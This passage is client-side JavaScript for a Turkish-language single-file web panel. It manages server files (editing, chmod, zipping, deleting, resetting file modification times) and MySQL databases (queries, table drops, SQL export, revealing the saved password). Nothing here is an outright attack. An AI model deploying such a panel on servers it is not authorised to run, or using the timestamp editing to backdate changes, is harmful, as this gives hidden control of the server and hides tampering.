    footHtml: `<a class="btn" href="?stream=file&path=${encodeURIComponent(rel)}&csrf=${CSRF}">İndir</a><button class="btn btn-primary" onclick="closeModal()">Kapat</button>`
  });
}
function previewAudio(name){
  const rel = joinPath(currentPath, name);
  const url = '?stream=preview&path=' + encodeURIComponent(rel) + '&csrf=' + CSRF;
  openModal({
    title: name,
    bodyHtml: `<audio controls style="width:100%;" src="${url}"></audio>`,
    footHtml: `<a class="btn" href="?stream=file&path=${encodeURIComponent(rel)}&csrf=${CSRF}">İndir</a><button class="btn btn-primary" onclick="closeModal()">Kapat</button>`
  });
}
async function unzipFile(name){
  try{ await api('fm_unzip', { path: currentPath, file: name }); toast('Arşiv çıkartıldı'); loadFiles(currentPath); }
  catch(e){ toast(e.message, 'error'); }
}
function renameItem(name){
  openModal({
    title: 'Yeniden Adlandır',
    bodyHtml: `<div class="field"><label>Yeni Ad</label><input type="text" id="renameVal" value="${esc(name)}"></div>`,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="renameGo">Kaydet</button>`
  });
  const inp = document.getElementById('renameVal');
  inp.focus(); inp.select();
  document.getElementById('renameGo').addEventListener('click', async () => {
    const val = inp.value.trim();
    if (!val) return;
    try{ await api('fm_rename', { path: currentPath, old: name, new: val }); closeModal(); toast('Yeniden adlandırıldı'); loadFiles(currentPath); }
    catch(e){ toast(e.message, 'error'); }
  });
}
function chmodItem(name){
  const item = currentItems.find(i => i.name === name);
  openModal({
    title: 'İzinleri Değiştir — ' + name,
    bodyHtml: `<div class="field"><label>İzin (ör. 0755)</label><input type="text" id="chmodVal" value="${esc(item?.perms||'0644')}"></div>`,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="chmodGo">Uygula</button>`
  });
  document.getElementById('chmodGo').addEventListener('click', async () => {
    const val = document.getElementById('chmodVal').value.trim();
    try{ await api('fm_chmod', { path: currentPath, file: name, perm: val }); closeModal(); toast('İzinler güncellendi'); loadFiles(currentPath); }
    catch(e){ toast(e.message, 'error'); }
  });
}
function touchItem(name){
  const item = currentItems.find(i => i.name === name);
  const val = item ? item.modified.replace(' ', 'T') : '';
  openModal({
    title: 'Değiştirilme Tarihini Düzenle — ' + name,
    bodyHtml: `
      <div class="field"><label>Yeni Tarih ve Saat</label><input type="datetime-local" id="touchVal" value="${esc(val)}"></div>
      <div class="hint">Not: Yalnızca "değiştirilme tarihi" (mtime) ayarlanabilir. Dosyanın işletim sistemi düzeyindeki inode değişim zamanı (ctime) teknik olarak değiştirilemez.</div>
    `,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="touchGo">Kaydet</button>`
  });
  document.getElementById('touchGo').addEventListener('click', async () => {
    const v = document.getElementById('touchVal').value;
    if (!v) return;
    try{ await api('fm_touch', { path: currentPath, file: name, date: v.replace('T',' ') }); closeModal(); toast('Tarih güncellendi'); loadFiles(currentPath); }
    catch(e){ toast(e.message, 'error'); }
  });
}
async function showInfo(name){
  try{
    const res = await api('fm_info', { path: currentPath, file: name });
    openModal({
      title: 'Özellikler — ' + name,
      bodyHtml: `
        <div class="field"><label>Tam Yol</label><input type="text" readonly value="${esc(res.path)}"></div>
        <div class="field-row">
          <div class="field"><label>Boyut</label><input type="text" readonly value="${esc(res.sizeH||'—')}"></div>
          <div class="field"><label>İzinler</label><input type="text" readonly value="${esc(res.perms)}"></div>
        </div>
        <div class="field-row">
          <div class="field"><label>Sahip</label><input type="text" readonly value="${esc(res.owner)}"></div>
          <div class="field"><label>Grup</label><input type="text" readonly value="${esc(res.group)}"></div>
        </div>
        <div class="field"><label>Değiştirilme (mtime)</label><input type="text" readonly value="${esc(res.mtime)}"></div>
        <div class="field"><label>Erişim (atime)</label><input type="text" readonly value="${esc(res.atime)}"></div>
        <div class="field"><label>Inode Değişikliği (ctime)</label><input type="text" readonly value="${esc(res.ctime)}"></div>
        ${res.mime ? `<div class="field"><label>MIME Türü</label><input type="text" readonly value="${esc(res.mime)}"></div>` : ''}
        ${res.isLink ? `<div class="field"><label>Sembolik Bağlantı Hedefi</label><input type="text" readonly value="${esc(res.linkTarget)}"></div>` : ''}
      `,
      footHtml: `<button class="btn btn-primary" onclick="closeModal()">Kapat</button>`
    });
  }catch(e){ toast(e.message, 'error'); }
}
async function duplicateItem(name){
  try{ const res = await api('fm_duplicate', { path: currentPath, name }); toast('Kopyalandı: ' + res.name); loadFiles(currentPath); }
  catch(e){ toast(e.message, 'error'); }
}
function deleteItems(names){
  const selfIncluded = names.some(n => { const it = currentItems.find(i => i.name === n); return it && it.isSelf; });
  openModal({
    title: 'Silme Onayı',
    bodyHtml: selfIncluded
      ? `<p style="color:var(--danger); font-weight:600;">⚠ Seçtiğiniz öğeler arasında şu an çalıştırdığınız panel dosyası (${esc(names.find(n => { const it = currentItems.find(i => i.name === n); return it && it.isSelf; }))}) da var! Bunu silerseniz panele bir daha erişemezsiniz. Yine de devam etmek istediğinize emin misiniz?</p>`
      : `<p>${names.length} öğeyi silmek istediğinize emin misiniz? Bu işlem geri alınamaz.</p>`,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-danger" id="delGo">${selfIncluded ? 'Yine de Sil' : 'Sil'}</button>`
  });
  document.getElementById('delGo').addEventListener('click', async () => {
    try{ await api('fm_delete', { path: currentPath, items: names }); closeModal(); toast('Silindi'); loadFiles(currentPath); }
    catch(e){ toast(e.message, 'error'); }
  });
}
document.getElementById('btnDeleteSelected').addEventListener('click', () => deleteItems([...selected]));
document.getElementById('btnZipSelected').addEventListener('click', () => { if (selected.size) zipItemsDownload([...selected]); });
document.getElementById('btnZipServer').addEventListener('click', () => { if (selected.size) zipItemsServer([...selected]); });

function cutItems(names){
  if (!names.length) return;
  clipboard = { mode: 'cut', path: currentPath, items: names };
  toast(names.length + ' öğe kesildi');
  updatePasteBtn();
}
function copyItemsToClipboard(names){
  if (!names.length) return;
  clipboard = { mode: 'copy', path: currentPath, items: names };
  toast(names.length + ' öğe kopyalandı');
  updatePasteBtn();
}
async function pasteHere(){
  if (!clipboard) return;
  try{
    const res = await api('fm_paste', { pathFrom: clipboard.path, pathTo: currentPath, mode: clipboard.mode, items: clipboard.items });
    if (clipboard.mode === 'cut') { clipboard = null; updatePasteBtn(); }
    toast('Yapıştırıldı' + (res.skipped && res.skipped.length ? ' (atlananlar: ' + res.skipped.join(', ') + ')' : ''));
    loadFiles(currentPath);
  }catch(e){ toast(e.message, 'error'); }
}
document.getElementById('btnCutSelected').addEventListener('click', () => cutItems([...selected]));
document.getElementById('btnCopySelected').addEventListener('click', () => copyItemsToClipboard([...selected]));
document.getElementById('btnPaste').addEventListener('click', pasteHere);
document.getElementById('btnMoveTo').addEventListener('click', () => { if (selected.size) openMoveCopyModal([...selected], 'move'); });
document.getElementById('btnCopyTo').addEventListener('click', () => { if (selected.size) openMoveCopyModal([...selected], 'copy'); });
function updatePasteBtn(){
  const btn = document.getElementById('btnPaste');
  if (clipboard) btn.classList.remove('hidden'); else btn.classList.add('hidden');
}

function openMoveCopyModal(names, mode){
  const isCopy = mode === 'copy';
  openModal({
    title: isCopy ? 'Kopyala' : 'Taşı',
    bodyHtml: `
      <div class="field"><label>Hedef Dizin (mutlak yol)</label><input type="text" id="moveCopyDest" value="${esc(currentPath)}"></div>
      <div class="hint">${names.length} öğe ${isCopy ? 'kopyalanacak' : 'taşınacak'}: ${esc(names.join(', '))}</div>
    `,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="moveCopyGo">${isCopy ? 'Kopyala' : 'Taşı'}</button>`
  });
  const inp = document.getElementById('moveCopyDest');
  inp.focus(); inp.select();
  document.getElementById('moveCopyGo').addEventListener('click', async () => {
    const dest = inp.value.trim();
    if (!dest) return;
    try{
      const res = await api('fm_paste', { pathFrom: currentPath, pathTo: dest, mode: isCopy ? 'copy' : 'cut', items: names });
      closeModal();
      toast((isCopy ? 'Kopyalandı' : 'Taşındı') + (res.skipped && res.skipped.length ? ' (atlananlar: ' + res.skipped.join(', ') + ')' : ''));
      loadFiles(currentPath);
    }catch(e){ toast(e.message, 'error'); }
  });
}
async function zipItemsDownload(names){
  try{
    const res = await api('fm_zip', { path: currentPath, items: names });
    window.location = '?stream=zip&token=' + res.token + '&name=' + encodeURIComponent(res.suggestedName) + '&csrf=' + CSRF;
    toast('Zip hazırlandı, indiriliyor');
  }catch(e){ toast(e.message, 'error'); }
}
async function zipItemsServer(names){
  try{
    const res = await api('fm_zip_server', { path: currentPath, items: names });
    toast('Sunucuya kaydedildi: ' + res.name);
    loadFiles(currentPath);
  }catch(e){ toast(e.message, 'error'); }
}

function b64EncodeUnicode(str){
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const chunk = 0x8000;
  for (let i = 0; i < bytes.length; i += chunk) binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
  return btoa(binary);
}
function b64DecodeUnicode(b64){
  const binary = atob(b64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
}

let cmLoaded = false;
let cmLoadPromise = null;

function loadCodeMirror(){
  if (cmLoadPromise) return cmLoadPromise;
  const CM = 'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/';
  const cssFiles = [CM + 'codemirror.min.css', CM + 'theme/material-darker.min.css', CM + 'addon/display/fullscreen.min.css'];
  const jsFiles = [
    CM + 'codemirror.min.js',
    CM + 'mode/xml/xml.min.js',
    CM + 'mode/javascript/javascript.min.js',
    CM + 'mode/css/css.min.js',
    CM + 'mode/htmlmixed/htmlmixed.min.js',
    CM + 'mode/clike/clike.min.js',
    CM + 'mode/php/php.min.js',
    CM + 'mode/python/python.min.js',
    CM + 'mode/shell/shell.min.js',
    CM + 'mode/sql/sql.min.js',
    CM + 'mode/yaml/yaml.min.js',
    CM + 'mode/markdown/markdown.min.js',
    CM + 'addon/edit/matchbrackets.min.js',
    CM + 'addon/edit/closebrackets.min.js',
    CM + 'addon/selection/active-line.min.js',
    CM + 'addon/search/searchcursor.min.js',
    CM + 'addon/search/search.min.js',
    CM + 'addon/dialog/dialog.min.js',
    CM + 'addon/comment/comment.min.js',
    CM + 'addon/display/fullscreen.min.js',
  ];
  cssFiles.forEach(href => {
    const link = document.createElement('link');
    link.rel = 'stylesheet'; link.href = href;
    document.head.appendChild(link);
  });
  const dialogCss = document.createElement('link');
  dialogCss.rel = 'stylesheet'; dialogCss.href = CM + 'addon/dialog/dialog.min.css';
  document.head.appendChild(dialogCss);

  cmLoadPromise = jsFiles.reduce((p, src) => p.then(() => new Promise((resolve) => {
    const s = document.createElement('script');
    s.src = src; s.onload = resolve; s.onerror = resolve;
    document.head.appendChild(s);
  })), Promise.resolve()).then(() => { cmLoaded = true; });
  return cmLoadPromise;
}

const CM_MODE_MAP = {
  php:'application/x-httpd-php', phtml:'application/x-httpd-php',
  js:'javascript', json:{name:'javascript', json:true}, jsx:'javascript',
  ts:'application/typescript', tsx:'application/typescript',
  html:'htmlmixed', htm:'htmlmixed', xml:'xml', svg:'xml',
  css:'css',
  py:'python',
  sh:'shell', bash:'shell',
  sql:'text/x-sql',
  yml:'yaml', yaml:'yaml',
  md:'markdown',
  c:'text/x-csrc', cpp:'text/x-c++src', h:'text/x-csrc', hpp:'text/x-c++src',
  java:'text/x-java',
  env:null, txt:null, log:null, ini:null, conf:null, config:null,
};
function cmModeFor(name){
  const ext = (name.split('.').pop() || '').toLowerCase();
  return Object.prototype.hasOwnProperty.call(CM_MODE_MAP, ext) ? CM_MODE_MAP[ext] : null;
}

function cmMoveLine(cm, dir){
  const cur = cm.getCursor();
  const target = cur.line + dir;
  if (target < 0 || target >= cm.lineCount()) return;
  const a = cm.getLine(cur.line), b = cm.getLine(target);
  cm.operation(() => {
    cm.replaceRange(a, {line: target, ch: 0}, {line: target, ch: b.length});
    cm.replaceRange(b, {line: cur.line, ch: 0}, {line: cur.line, ch: a.length});
    cm.setCursor({line: target, ch: cur.ch});
  });
}
function cmCopyLine(cm, dir){
  const cur = cm.getCursor();
  const text = cm.getLine(cur.line);
  const insertAt = dir > 0 ? cur.line + 1 : cur.line;
  cm.operation(() => {
    cm.replaceRange(text + '\n', {line: insertAt, ch: 0});
    cm.setCursor({line: insertAt + (dir > 0 ? 0 : 1), ch: cur.ch});
  });
}
function cmDeleteLine(cm){
  const cur = cm.getCursor();
  const line = cur.line;
  if (cm.lineCount() === 1){ cm.setValue(''); return; }
  if (line < cm.lineCount() - 1) cm.replaceRange('', {line, ch:0}, {line: line+1, ch:0});
  else cm.replaceRange('', {line: line-1, ch: cm.getLine(line-1).length}, {line, ch: cm.getLine(line).length});
}
function cmToggleFullscreen(cm){
  const isFull = !cm.getOption('fullScreen');
  cm.setOption('fullScreen', isFull);
  let btn = document.getElementById('cmFullscreenExit');
  if (isFull){
    if (!btn){
      btn = document.createElement('button');
      btn.id = 'cmFullscreenExit';
      btn.className = 'cm-fullscreen-exit';
      btn.innerHTML = ICONS.x + '<span>Tam Ekrandan Çık</span>';
      btn.addEventListener('click', () => cmToggleFullscreen(cm));
      document.body.appendChild(btn);
    }
    btn.style.display = 'flex';
  } else if (btn){
    btn.style.display = 'none';
  }
}

async function openEditor(name){
  try{
    const res = await api('fm_read', { path: currentPath, file: name });
    const content = b64DecodeUnicode(res.content);
    openModal({
      title: 'Düzenle — ' + name, xwide: true,
      bodyHtml: `<div class="editor-wrap"><textarea id="editorArea" spellcheck="false">${esc(content)}</textarea></div>`,
      footHtml: `<span class="hint" style="margin-right:auto; align-self:center;">Ctrl+S kaydet · Ctrl+/ yorum · Alt+↑↓ satır taşı · F11 tam ekran</span><button class="btn" id="fullscreenGo">Tam Ekran</button><button class="btn" onclick="closeModal()">Kapat</button><button class="btn btn-primary" id="saveGo">Kaydet</button>`
    });
    const textarea = document.getElementById('editorArea');
    activeEditor = null;

    const doSave = async () => {
      const btn = document.getElementById('saveGo');
      if (!btn) return;
      const newContent = activeEditor ? activeEditor.getValue() : textarea.value;
      btn.textContent = 'Kaydediliyor...'; btn.disabled = true;
      try{
        await api('fm_save', { path: currentPath, file: name, content: b64EncodeUnicode(newContent) });
        toast('Kaydedildi');
      }catch(e){ toast(e.message, 'error'); }
      btn.textContent = 'Kaydet'; btn.disabled = false;
    };
    document.getElementById('saveGo').addEventListener('click', doSave);
    document.getElementById('fullscreenGo').addEventListener('click', () => { if (activeEditor) cmToggleFullscreen(activeEditor); });

    loadCodeMirror().then(() => {
      if (!document.body.contains(textarea) || typeof CodeMirror === 'undefined') return;
      const isLight = document.documentElement.getAttribute('data-theme') === 'light';
      const cm = CodeMirror.fromTextArea(textarea, {
        mode: cmModeFor(name),
        lineNumbers: true,
        theme: isLight ? 'default' : 'material-darker',
        matchBrackets: true,
        autoCloseBrackets: true,
        styleActiveLine: true,
        indentUnit: 4,
        tabSize: 4,
        lineWrapping: true,
        extraKeys: {
          'Ctrl-S': () => doSave(), 'Cmd-S': () => doSave(),
          'Ctrl-/': 'toggleComment', 'Cmd-/': 'toggleComment',
          'F11': (c) => cmToggleFullscreen(c),
          'Alt-Up': (c) => cmMoveLine(c, -1),
          'Alt-Down': (c) => cmMoveLine(c, 1),
          'Shift-Alt-Up': (c) => cmCopyLine(c, -1),
          'Shift-Alt-Down': (c) => cmCopyLine(c, 1),
          'Ctrl-Shift-K': (c) => cmDeleteLine(c), 'Cmd-Shift-K': (c) => cmDeleteLine(c),
        },
      });
      cm.setSize('100%', '100%');
      activeEditor = cm;
    });
  }catch(e){ toast(e.message, 'error'); }
}

let searchTimer;
document.getElementById('fmSearch').addEventListener('input', (e) => {
  clearTimeout(searchTimer);
  const q = e.target.value.trim();
  if (!q){ renderFileList(); return; }
  searchTimer = setTimeout(async () => {
    try{
      const res = await api('fm_search', { path: currentPath, q });
      const tbody = document.getElementById('fileList');
      document.getElementById('emptyState').classList.add('hidden');
      tbody.innerHTML = res.items.map(it => `
        <tr><td></td>
        <td><div class="file-row-name" data-path="${esc(it.path)}" data-isdir="${it.isDir?1:0}">
          <span class="icon-${it.icon}">${ICONS[it.icon]||ICONS.file}</span><span>${esc(it.name)}</span>
        </div></td>
        <td class="muted mono" colspan="4">${esc(it.path)}</td></tr>
      `).join('') || `<tr><td colspan="6" class="muted" style="padding:20px;text-align:center;">Sonuç yok</td></tr>`;
      tbody.querySelectorAll('.file-row-name').forEach(el => {
        el.addEventListener('click', () => {
          const p = el.dataset.path;
          if (el.dataset.isdir === '1') { goToPath(p); return; }
          const idx = p.lastIndexOf('/');
          const dir = idx > 0 ? p.substring(0, idx) : '/';
          const fname = p.substring(idx + 1);
          currentPath = dir;
          openEditor(fname);
        });
      });
    }catch(e){ toast(e.message, 'error'); }
  }, 350);
});

let dbInited = false;
let dbConnections = {}; /* connId -> {host, name} */
let dbTab = 'tables';
let currentTable = null;
let currentTablePk = null;
let currentDbPage = 1;

function humanSizeJS(bytes){
  if (!bytes || bytes <= 0) return '0 B';
  const units = ['B','KB','MB','GB','TB'];
  const i = Math.min(units.length - 1, Math.floor(Math.log(bytes) / Math.log(1024)));
  return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + units[i];
}

async function exportDatabase(table){
  let estimate = 0;
  try{
    const sizeRes = await api('db_export_size', { table: table || '' });
    estimate = sizeRes.bytes || 0;
  }catch(e){  }

  openModal({
    title: table ? ('Dışa Aktarılıyor — ' + table) : 'Tüm Veritabanı Dışa Aktarılıyor',
    bodyHtml: `
      <div class="export-progress">
        <div class="export-progress-bar"><div class="export-progress-fill" id="exportFill" style="width:0%"></div></div>
        <div class="export-progress-text" id="exportText">Hazırlanıyor...</div>
        ${estimate ? `<div class="hint">Tahmini boyut: ~${esc(humanSizeJS(estimate))} (gerçek SQL dosyası, sorgu eklerinden dolayı biraz daha büyük olabilir)</div>` : ''}
      </div>
    `,
    footHtml: `<button class="btn" id="exportCancel">İptal</button>`
  });
  let cancelled = false;
  document.getElementById('exportCancel').addEventListener('click', () => { cancelled = true; closeModal(); });

  const fillEl = document.getElementById('exportFill');
  const textEl = document.getElementById('exportText');

  try{
    const url = '?stream=dbexport' + (table ? '&table=' + encodeURIComponent(table) : '') + '&connId=' + encodeURIComponent(activeConnId || '') + '&csrf=' + CSRF;
    const response = await fetch(url);
    if (!response.ok) throw new Error('Dışa aktarma başarısız (HTTP ' + response.status + ')');
    const cd = response.headers.get('Content-Disposition') || '';
    const m = cd.match(/filename="?([^"\r\n]+)"?/);
    const filename = m ? m[1] : ((table || 'export') + '.sql');

    const reader = response.body.getReader();
    const chunks = [];
    let received = 0;
    while (true) {
      const { done, value } = await reader.read();
      if (cancelled) { try{ reader.cancel(); }catch(_){} return; }
      if (done) break;
      chunks.push(value);
      received += value.length;
      const pct = estimate > 0 ? Math.min(99, Math.round((received / estimate) * 100)) : Math.min(95, Math.round(received / 1024 / 50));
      fillEl.style.width = pct + '%';
      textEl.textContent = pct + '% · ' + humanSizeJS(received) + (estimate ? ' / ~' + humanSizeJS(estimate) : ' indirildi');
    }
    if (cancelled) return;
    fillEl.style.width = '100%';
    const blob = new Blob(chunks, { type: 'application/sql' });
    textEl.textContent = '100% · Toplam ' + humanSizeJS(blob.size) + ' — indiriliyor';

    const dlUrl = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = dlUrl; a.download = filename;
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(dlUrl), 4000);

    toast('Dışa aktarma tamamlandı: ' + filename + ' (' + humanSizeJS(blob.size) + ')');
    setTimeout(closeModal, 700);
  }catch(e){
    if (!cancelled) { toast(e.message, 'error'); closeModal(); }
  }
}

async function initDb(){
  dbInited = true;
  try{
    const st = await api('db_status');
    dbConnections = {};
    (st.connections || []).forEach(c => { dbConnections[c.connId] = { host: c.host, name: c.name }; });
    if (!activeConnId || !dbConnections[activeConnId]){
      const ids = Object.keys(dbConnections);
      activeConnId = ids.length ? ids[0] : null;
    }
    renderDbShell();
  }catch(e){ toast(e.message, 'error'); }
}

function renderConnTabsBar(){
  const ids = Object.keys(dbConnections);
  const tabsHtml = ids.map(id => {
    const c = dbConnections[id];
    const label = c.name ? (c.host + ' / ' + c.name) : (c.host + ' — veritabanı seçilmedi');
    return `
      <div class="conn-tab ${id === activeConnId ? 'active' : ''}" data-connid="${esc(id)}">
        <span class="conn-tab-label">${esc(label)}</span>
        <button class="conn-tab-close" data-conncloseid="${esc(id)}" title="Bağlantıyı Kes">${ICONS.x}</button>
      </div>`;
  }).join('');
  return `
    <div class="conn-tabs-bar">
      ${tabsHtml}
      <button class="conn-tab-add" id="btnAddConn" title="Yeni Bağlantı">${ICONS.plus} Yeni Bağlantı</button>
    </div>`;
}
function bindConnTabsBar(container){
  container.querySelectorAll('.conn-tab').forEach(el => {
    el.addEventListener('click', (e) => {
      if (e.target.closest('.conn-tab-close')) return;
      activeConnId = el.dataset.connid;
      currentTable = null; dbTab = 'tables';
      renderDbShell();
    });
  });
  container.querySelectorAll('.conn-tab-close').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.stopPropagation();
      const id = btn.dataset.conncloseid;
      try{ await api('db_disconnect', { connId: id }); }catch(err){}
      delete dbConnections[id];
      if (activeConnId === id){
        const ids = Object.keys(dbConnections);
        activeConnId = ids.length ? ids[0] : null;
        currentTable = null; dbTab = 'tables';
      }
      toast('Bağlantı kesildi');
      renderDbShell();
    });
  });
  container.querySelector('#btnAddConn').addEventListener('click', () => { activeConnId = null; renderDbShell(); });
}

function renderDbShell(){
  const view = document.getElementById('dbView');
  const hasConns = Object.keys(dbConnections).length > 0;
  const badge = document.getElementById('dbStatusBadge');
  const active = activeConnId ? dbConnections[activeConnId] : null;
  if (active){ badge.textContent = 'Bağlı: ' + active.host + (active.name ? ' / ' + active.name : ''); badge.className = 'badge badge-green'; }
  else { badge.textContent = 'Bağlı değil'; badge.className = 'badge badge-gray'; }

  // Yeni bağlantı formu (activeConnId yok demek ya hiç bağlantı yok ya da "+ Yeni Bağlantı" tıklandı)
  if (!activeConnId){
    view.innerHTML = `
      ${hasConns ? renderConnTabsBar() : ''}
      <div style="max-width:420px; margin:30px auto;">
        <div class="stat-card">
          <div class="label" style="margin-bottom:14px;">Yeni MySQL Bağlantısı</div>
          <div class="field"><label>Sunucu (Host)</label><input type="text" id="dbHost" value="localhost"></div>
          <div class="field-row">
            <div class="field"><label>Kullanıcı Adı</label><input type="text" id="dbUser" placeholder="veritabanı kullanıcı adınız"></div>
            <div class="field"><label>Port</label><input type="text" id="dbPort" value="3306"></div>
          </div>
          <div class="field">
            <label>Şifre</label>
            <div class="pw-field">
              <input type="password" id="dbPass">
              <button type="button" class="pw-toggle" id="dbPassToggle" title="Şifreyi göster/gizle">${ICONS.eye}</button>
            </div>
          </div>
          <div class="field"><label>Veritabanı Adı (opsiyonel — boş bırakırsanız tüm veritabanlarınızı listeleriz)</label><input type="text" id="dbName" placeholder="boş bırakılabilir"></div>
          <button class="btn btn-primary" style="width:100%; justify-content:center;" id="dbConnectGo">Bağlan</button>
        </div>
      </div>`;
    if (hasConns) bindConnTabsBar(view.querySelector('.conn-tabs-bar'));
    document.getElementById('dbPassToggle').addEventListener('click', () => {
      const inp = document.getElementById('dbPass');
      const isPw = inp.type === 'password';
      inp.type = isPw ? 'text' : 'password';
      document.getElementById('dbPassToggle').innerHTML = isPw ? ICONS.eyeOff : ICONS.eye;
    });
    document.getElementById('dbConnectGo').addEventListener('click', async () => {
      const btn = document.getElementById('dbConnectGo');
      btn.textContent = 'Bağlanıyor...'; btn.disabled = true;
      try{
        const res = await api('db_connect', {
          host: document.getElementById('dbHost').value,
          user: document.getElementById('dbUser').value,
          pass: document.getElementById('dbPass').value,
          name: document.getElementById('dbName').value,
          port: document.getElementById('dbPort').value,
        });
        dbConnections[res.connId] = { host: res.host, name: res.name };
        activeConnId = res.connId;
        toast('Bağlantı başarılı');
        renderDbShell();
      }catch(e){ btn.textContent = 'Bağlan'; btn.disabled = false; toast(e.message, 'error'); }
    });
    return;
  }

  // Bağlantı var ama veritabanı seçilmemiş: veritabanı listesini göster
  if (!active.name){
    view.innerHTML = `${renderConnTabsBar()}<div id="dbPickerArea" style="padding-top:16px;">Yükleniyor...</div>`;
    bindConnTabsBar(view.querySelector('.conn-tabs-bar'));
    api('db_databases').then(res => {
      const area = document.getElementById('dbPickerArea');
      if (!area) return;
      area.innerHTML = `
        <div class="stat-card" style="max-width:480px;">
          <div class="label" style="margin-bottom:12px;">Bir Veritabanı Seçin (${active.host})</div>
          <div style="display:flex; flex-direction:column; gap:6px;">
            ${res.databases.map(d => `<button class="btn" data-pickdb="${esc(d)}" style="justify-content:flex-start;">${ICONS.table} ${esc(d)}</button>`).join('') || '<span class="muted">Hiç veritabanı bulunamadı.</span>'}
          </div>
        </div>`;
      area.querySelectorAll('[data-pickdb]').forEach(btn => btn.addEventListener('click', async () => {
        try{
          await api('db_use', { name: btn.dataset.pickdb });
          dbConnections[activeConnId].name = btn.dataset.pickdb;
          toast('Veritabanı seçildi: ' + btn.dataset.pickdb);
          renderDbShell();
        }catch(e){ toast(e.message, 'error'); }
      }));
    }).catch(e => toast(e.message, 'error'));
    return;
  }

  // Bağlantı ve veritabanı hazır: normal sekmeleri göster
  view.innerHTML = `
    ${renderConnTabsBar()}
    <div class="db-tabs">
      <div class="db-tab" data-tab="tables">Tablolar</div>
      <div class="db-tab" data-tab="query">SQL Sorgusu</div>
      <div class="db-tab" data-tab="import">İçe Aktar</div>
      <div class="db-tab" data-tab="export">Dışa Aktar</div>
      <div class="db-tab" data-tab="create">Yeni Tablo</div>
      <div class="spacer" style="flex:1;"></div>
      <div class="db-tab" id="btnConnInfo" title="Bağlantı Bilgilerini Göster">${ICONS.info} Bağlantı Bilgisi</div>
      <div class="db-tab" id="dbChangeDatabase" title="Başka veritabanı seç">${esc(active.name)} ▾</div>
    </div>
    <div id="dbTabContent"></div>
  `;
  bindConnTabsBar(view.querySelector('.conn-tabs-bar'));
  document.querySelectorAll('.db-tab[data-tab]').forEach(t => t.addEventListener('click', () => { dbTab = t.dataset.tab; renderDbTabs(); loadDbTabContent(); }));
  document.getElementById('dbChangeDatabase').addEventListener('click', () => {
    dbConnections[activeConnId].name = '';
    renderDbShell();
  });
  document.getElementById('btnConnInfo').addEventListener('click', showConnectionInfo);
  renderDbTabs();
  loadDbTabContent();
}
function renderDbTabs(){ document.querySelectorAll('.db-tab[data-tab]').forEach(t => t.classList.toggle('active', t.dataset.tab === dbTab)); }

async function showConnectionInfo(){
  try{
    const res = await api('db_connection_info');
    openModal({
      title: 'Bağlantı Bilgileri',
      bodyHtml: `
        <div class="field"><label>Sunucu (Host)</label><input type="text" readonly value="${esc(res.host)}"></div>
        <div class="field-row">
          <div class="field"><label>Kullanıcı Adı</label><input type="text" readonly value="${esc(res.user)}"></div>
          <div class="field"><label>Port</label><input type="text" readonly value="${esc(res.port)}"></div>
        </div>
        <div class="field">
          <label>Şifre</label>
          <div class="pw-field">
            <input type="password" id="connInfoPass" readonly value="${esc(res.pass)}">
            <button type="button" class="pw-toggle" id="connInfoPassToggle" title="Şifreyi göster/gizle">${ICONS.eye}</button>
          </div>
        </div>
        <div class="field"><label>Veritabanı Adı</label><input type="text" readonly value="${esc(res.name || '—')}"></div>
      `,
      footHtml: `<button class="btn btn-primary" onclick="closeModal()">Kapat</button>`
    });
    document.getElementById('connInfoPassToggle').addEventListener('click', () => {
      const inp = document.getElementById('connInfoPass');
      const isPw = inp.type === 'password';
      inp.type = isPw ? 'text' : 'password';
      document.getElementById('connInfoPassToggle').innerHTML = isPw ? ICONS.eyeOff : ICONS.eye;
    });
  }catch(e){ toast(e.message, 'error'); }
}

async function loadDbTabContent(){
  const c = document.getElementById('dbTabContent');
  if (dbTab === 'tables'){
    if (currentTable) return renderTableBrowser();
    try{
      const res = await api('db_tables');
      c.innerHTML = `
        <div class="toolbar" style="margin-bottom:12px;">
          <div class="select-info hidden" id="tableSelectInfo">
            <span id="tableSelectCount">0 tablo seçildi</span>
            <button class="btn btn-sm" id="btnTruncateSelectedTables">Seçilenleri Boşalt</button>
            <button class="btn btn-sm btn-danger" id="btnDropSelectedTables">Seçilenleri Sil</button>
          </div>
        </div>
        <div class="table-wrap">
          <table><thead><tr><th style="width:34px;"><input type="checkbox" class="checkbox" id="selectAllTables"></th><th>Tablo</th><th>Satır</th><th>Boyut</th><th>Motor</th><th></th></tr></thead>
          <tbody>${res.tables.map(t => `
            <tr>
              <td><input type="checkbox" class="checkbox table-check" data-tname="${esc(t.name)}"></td>
              <td><div class="file-row-name" data-table="${esc(t.name)}">${ICONS.table}<span>${esc(t.name)}</span></div></td>
              <td class="muted">${esc(t.rows)}</td>
              <td class="muted">${esc(t.size)}</td>
              <td class="muted">${esc(t.engine||'-')}</td>
              <td><div class="row-actions" style="opacity:1;">
                <button class="icon-btn" data-truncate="${esc(t.name)}" title="Tabloyu Boşalt">${ICONS.trash}</button>
                <button class="icon-btn danger" data-drop="${esc(t.name)}" title="Tabloyu Sil">${ICONS.trash}</button>
              </div></td>
            </tr>`).join('') || `<tr><td colspan="6" class="muted" style="text-align:center;padding:20px;">Tablo bulunamadı</td></tr>`}
          </tbody></table>
        </div>`;
      const tableSelected = new Set();
      function updateTableSelectInfo(){
        const box = document.getElementById('tableSelectInfo');
        if (tableSelected.size > 0){ box.classList.remove('hidden'); document.getElementById('tableSelectCount').textContent = tableSelected.size + ' tablo seçildi'; }
        else box.classList.add('hidden');
      }
      c.querySelectorAll('.table-check').forEach(cb => cb.addEventListener('change', () => {
